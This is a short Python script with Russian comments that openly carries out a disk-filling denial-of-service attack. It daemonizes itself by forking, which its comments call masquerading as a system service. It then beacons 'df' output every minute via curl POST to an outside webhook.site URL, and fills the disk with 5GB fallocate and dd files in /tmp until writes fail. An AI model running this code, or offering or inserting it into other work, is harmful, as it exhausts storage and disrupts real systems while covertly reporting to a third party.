import os
import subprocess
import time
import signal

WEBHOOK_URL = "https://webhook.site/e497c7bf-1edd-41d4-ba35-a5f6311a07a8"

def get_disk_info():
    """Получаем инфу о диске через df"""
    try:
        # Берем корень / или текущую папку /app
        result = subprocess.check_output(['df', '-h', '/']).decode('utf-8')
        return result
    except:
        return "Error getting disk info"

def send_heartbeat():
    """Каждую минуту шлем статус на Webhook"""
    while True:
        disk_status = get_disk_info()
        payload = f"STAT: {disk_status}"
        try:
            subprocess.run(['curl', '-s', '-X', 'POST', '-d', payload, WEBHOOK_URL])
        except:
            pass
        time.sleep(60)

def fill_disk():
    """Забиваем диск до отказа"""
    print("[!] Disk filling sequence started...")
    counter = 0
    while True:
        # Создаем файлы по 5GB, пока место не кончится
        file_name = f"/tmp/large_dump_{counter}.bin"
        try:
            # fallocate мгновенно резервирует место на диске
            subprocess.run(['fallocate', '-l', '5G', file_name], check=True)
            print(f"[+] Created 5GB file: {file_name}")
            counter += 1
        except subprocess.CalledProcessError:
            # Если место кончилось, переходим к записи мелкими блоками по 100MB
            try:
                subprocess.run(['dd', 'if=/dev/zero', f'of={file_name}_end', 'bs=100M', 'count=10'], check=True)
            except:
                print("[!!!] DISK FULL [!!!]")
                break
        time.sleep(1)

if __name__ == "__main__":
    # 1. Маскируемся под системную службу (Senior C++ dev style)
    if os.fork() > 0: os._exit(0)
    
    # 2. Запускаем маяк в отдельном процессе
    from multiprocessing import Process
    Process(target=send_heartbeat, daemon=True).start()

    # 3. Начинаем атаку на диск
    fill_disk()
    
    # Чтобы процесс не висел просто так после заполнения
    while True:
        time.sleep(3600)
